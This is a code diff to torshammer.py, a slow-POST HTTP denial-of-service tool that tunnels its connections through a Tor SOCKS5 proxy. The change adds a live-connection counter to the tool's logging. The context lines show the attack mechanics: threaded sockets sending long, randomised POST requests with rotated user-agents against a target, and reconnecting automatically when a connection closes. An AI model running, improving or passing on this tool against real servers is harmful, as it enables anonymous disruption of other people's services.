@@ -17,9 +17,8 @@ import ssl
 from urllib.parse import urlparse
 from threading import Thread
 
-global stop_now
-
 stop_now = False
+live_connections = 0
 
 def get_useragent_list():
 	with open('user-agents.txt') as f:
@@ -46,13 +45,15 @@ class HttpPostThread(Thread):
             self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
 
     def _log(self, msg):
-        print(f'[Thread #{self.thread_id}] {msg}')
+        global live_connections
+        print(f'[{live_connections} live connections, thread #{self.thread_id}] {msg}')
 
     def _format_error_message(self, err):
         return err.msg if hasattr(err, 'msg') else f'{err.errno} {err.strerror}'
 
     def _send_http_post(self):
         global stop_now
+        global live_connections
 
         payload_length = random.randint(5000, 10000)
         headers_list = [
@@ -85,6 +86,7 @@ class HttpPostThread(Thread):
         self.transport = self.socket if self.port != 443 else ssl.wrap_socket(self.socket)
 
     def run(self):
+        global live_connections
         while self.running:
             while self.running:
                 try:
@@ -98,12 +100,15 @@ class HttpPostThread(Thread):
 
             while self.running:
                 try:
+                    live_connections += 1
                     self._send_http_post()
                 except Exception as e:
                     self._log(f'Connection closed, error: {self._format_error_message(e)}. Restarting...')
                     self._init_socket()
                     time.sleep(1)
                     break
+                finally:
+                    live_connections -= 1
 
 def usage():
     print('./torshammer.py -t <target> [-r <threads> -T -h]')
